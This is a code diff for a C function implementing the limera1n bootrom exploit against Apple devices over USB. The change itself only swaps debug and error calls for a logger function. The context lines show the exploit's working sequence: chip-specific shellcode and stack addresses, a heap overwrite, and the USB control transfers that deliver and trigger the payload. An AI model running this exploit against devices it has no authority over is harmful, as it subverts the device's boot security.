@@ -78,7 +78,7 @@ int limera1n_exploit(struct irecv_device *device, irecv_client_t *pclient)
 		stack_address = 0x84033F98;
 		shellcode_address = 0x84023001;
 	} else {
-		error("Unsupported ChipID 0x%04x. Can't exploit with limera1n.\n", device->chip_id);
+		logger(LL_ERROR, "Unsupported ChipID 0x%04x. Can't exploit with limera1n.\n", device->chip_id);
 		return -1;
 	}
 
@@ -87,10 +87,10 @@ int limera1n_exploit(struct irecv_device *device, irecv_client_t *pclient)
 
 	irecv_client_t client = *pclient;
 
-	debug("Resetting device counters\n");
+	logger(LL_DEBUG, "Resetting device counters\n");
 	err = irecv_reset_counters(client);
 	if (err != IRECV_E_SUCCESS) {
-		error("%s\n", irecv_strerror(err));
+		logger(LL_ERROR, "%s\n", irecv_strerror(err));
 		return -1;
 	}
 
@@ -103,7 +103,7 @@ int limera1n_exploit(struct irecv_device *device, irecv_client_t *pclient)
 		heap[3] = stack_address;
 	}
 
-	debug("Sending chunk headers\n");
+	logger(LL_DEBUG, "Sending chunk headers\n");
 	irecv_usb_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
 
 	memset(buf, 0xCC, 0x800);
@@ -111,32 +111,32 @@ int limera1n_exploit(struct irecv_device *device, irecv_client_t *pclient)
 		irecv_usb_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
 	}
 
-	debug("Sending exploit payload\n");
+	logger(LL_DEBUG, "Sending exploit payload\n");
 	irecv_usb_control_transfer(client, 0x21, 1, 0, 0, shellcode, 0x800, 1000);
 
-	debug("Sending fake data\n");
+	logger(LL_DEBUG, "Sending fake data\n");
 	memset(buf, 0xBB, 0x800);
 	irecv_usb_control_transfer(client, 0xA1, 1, 0, 0, buf, 0x800, 1000);
 	irecv_usb_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 10);
 
-	//debug("Executing exploit\n");
+	//logger(LL_DEBUG, "Executing exploit\n");
 	irecv_usb_control_transfer(client, 0x21, 2, 0, 0, buf, 0, 1000);
 
 	irecv_reset(client);
 	irecv_finish_transfer(client);
-	debug("Exploit sent\n");
+	logger(LL_DEBUG, "Exploit sent\n");
 
-	debug("Reconnecting to device\n");
+	logger(LL_DEBUG, "Reconnecting to device\n");
 	*pclient = irecv_reconnect(client, 7);
 	if (*pclient == NULL) {
-		error("Unable to reconnect\n");
+		logger(LL_ERROR, "Unable to reconnect\n");
 		return -1;
 	}
 
 	irecv_get_mode((*pclient), &mode);
 
 	if (mode != IRECV_K_DFU_MODE) {
-		error("Device reconnected in non-DFU mode\n");
+		logger(LL_ERROR, "Device reconnected in non-DFU mode\n");
 		return -1;
 	}
 
